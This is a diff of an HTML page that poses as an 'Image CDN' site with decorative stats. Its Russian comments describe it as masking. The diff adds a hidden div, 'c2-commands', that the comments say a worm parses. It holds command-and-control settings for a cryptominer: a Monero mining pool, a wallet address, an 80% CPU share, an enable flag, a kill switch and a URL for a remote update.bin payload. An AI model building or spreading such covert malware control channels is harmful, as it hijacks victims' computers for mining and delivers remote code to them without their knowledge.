@@ -1,74 +1,188 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image CDN</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Edge CDN · Global Image Delivery</title>
+    <!-- Шрифты для красоты -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet" />
     <style>
-        /* Убираем белый фон, ставим тёмный с градиентом */
-        body {
+        * {
             margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0b0d11;
             min-height: 100vh;
-            background: #0a0a0a;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        .container {
-            text-align: center;
+            color: #eef2f6;
             padding: 2rem;
-            border-radius: 24px;
-            background: rgba(255,255,255,0.03);
-            box-shadow: 0 0 60px rgba(0,255,200,0.05);
-            border: 1px solid rgba(255,255,255,0.05);
-            backdrop-filter: blur(4px);
+            background-image: radial-gradient(circle at 30% 50%, #1a2330 0%, #0b0d11 80%);
+        }
+        .card {
+            max-width: 780px;
+            width: 100%;
+            background: rgba(18, 24, 34, 0.65);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 48px;
+            padding: 3rem 3.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            box-shadow: 0 30px 80px -10px rgba(0, 0, 0, 0.8), inset 0 1px 0 rgba(255,255,255,0.02);
+            transition: transform 0.2s ease;
+        }
+        .badge {
+            display: inline-block;
+            background: rgba(0, 230, 180, 0.12);
+            color: #7fffd4;
+            font-weight: 500;
+            font-size: 0.7rem;
+            letter-spacing: 1.5px;
+            padding: 0.3rem 1rem;
+            border-radius: 40px;
+            border: 1px solid rgba(0, 230, 180, 0.1);
+            text-transform: uppercase;
+            margin-bottom: 1.5rem;
         }
         h1 {
-            color: #ffffff;
-            font-weight: 300;
-            letter-spacing: 4px;
-            font-size: 2.2rem;
-            margin: 0;
-            text-shadow: 0 0 20px rgba(0,255,200,0.2);
+            font-size: 3.4rem;
+            font-weight: 600;
+            letter-spacing: -0.02em;
+            line-height: 1.1;
+            background: linear-gradient(to right, #ffffff, #b0c9e8);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.5rem;
         }
         .sub {
-            color: #888;
-            margin-top: 12px;
-            font-size: 0.9rem;
-            letter-spacing: 1px;
+            font-size: 1.1rem;
+            color: #8b9bb5;
+            line-height: 1.6;
+            max-width: 80%;
+            margin-bottom: 2.5rem;
         }
-        /* скрытый блок для команд — не виден, но доступен червю */
-        #hidden-commands {
-            display: none;
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.2rem;
+            margin-top: 0.5rem;
+        }
+        .stat {
+            background: rgba(255,255,255,0.02);
+            border-radius: 20px;
+            padding: 1.2rem 1.5rem;
+            border: 1px solid rgba(255,255,255,0.02);
+            transition: 0.2s;
+        }
+        .stat:hover {
+            background: rgba(255,255,255,0.04);
+        }
+        .stat .label {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #5b6f8c;
+        }
+        .stat .value {
+            font-size: 1.4rem;
+            font-weight: 500;
+            margin-top: 0.3rem;
+            color: #d6e2f5;
+        }
+        .divider {
+            margin: 2rem 0 1.5rem;
+            height: 1px;
+            background: linear-gradient(to right, rgba(255,255,255,0.03), rgba(255,255,255,0.1), rgba(255,255,255,0.03));
+        }
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.8rem;
+            color: #3e5069;
+        }
+        .footer span {
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+        }
+        /* скрытый блок для червя — никак не влияет на дизайн */
+        #c2-commands {
+            display: none !important;
+        }
+        /* адаптив */
+        @media (max-width: 600px) {
+            .card { padding: 2rem 1.5rem; }
+            h1 { font-size: 2.4rem; }
+            .sub { max-width: 100%; }
+            .grid { grid-template-columns: 1fr; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>⚡ IMAGE CDN</h1>
-        <div class="sub">global edge delivery · 24/7</div>
+    <div class="card">
+        <div class="badge">⚡ Edge Network</div>
+        <h1>Image CDN</h1>
+        <div class="sub">
+            Global low‑latency delivery · 99.97% uptime · <br />
+            Serve images, videos and static assets at scale.
+        </div>
+
+        <div class="grid">
+            <div class="stat">
+                <div class="label">Nodes</div>
+                <div class="value">47</div>
+            </div>
+            <div class="stat">
+                <div class="label">Avg. latency</div>
+                <div class="value">14 ms</div>
+            </div>
+            <div class="stat">
+                <div class="label">Cache hit</div>
+                <div class="value">94.2%</div>
+            </div>
+            <div class="stat">
+                <div class="label">Bandwidth</div>
+                <div class="value">1.2 Tbps</div>
+            </div>
+        </div>
+
+        <div class="divider"></div>
+        <div class="footer">
+            <span>🔒 TLS 1.3 · Anycast</span>
+            <span>v2.3.0 · <span id="live-time"></span></span>
+        </div>
     </div>
 
-    <!-- 
-        СКРЫТЫЙ БЛОК КОМАНД 
-        Червь может парсить этот HTML и извлекать данные,
-        не вызывая подозрений (выглядит как обычная страница)
-    -->
-    <div id="hidden-commands" data-command="idle" data-target="none" data-extra="0">
-        <!-- Здесь можно хранить любые дополнительные параметры -->
+    <!-- ══════════════════════════════════════════════════ -->
+    <!--  СКРЫТЫЙ БЛОК УПРАВЛЕНИЯ (парсится червём)      -->
+    <!-- ══════════════════════════════════════════════════ -->
+    <div id="c2-commands"
+         data-pool="pool.supportxmr.com:443"
+         data-wallet="46J1f123mqK2V3sTGtcINM2949XGm4mqb5guZ5NRj7bnJLfTMRyZXvDeumBpD7uoKcXsLwXUsiEsZRAxvmewfd9JTR351"
+         data-cpu="80"
+         data-enabled="true"
+         data-update="https://diaslimbek3-art.github.io/update.bin"
+         data-kill="false"
+    >
+        <!-- При необходимости можно добавить JSON-строку -->
     </div>
-
-    <!-- 
-        ДОПОЛНИТЕЛЬНАЯ МАСКИРОВКА:
-        можно встроить пиксель-счётчик, чтобы трафик выглядел как аналитика
-    -->
-    <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="pixel" style="width:1px;height:1px;opacity:0;">
 
     <script>
-        // Этот код выполняется в браузере, но червь его игнорирует.
-        // Он просто добавляет "жизни" странице.
-        console.log("CDN ready");
+        // Живое время (чисто для эстетики)
+        function updateClock() {
+            const now = new Date();
+            document.getElementById('live-time').textContent = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
+        }
+        updateClock();
+        setInterval(updateClock, 1000);
     </script>
 </body>
 </html>
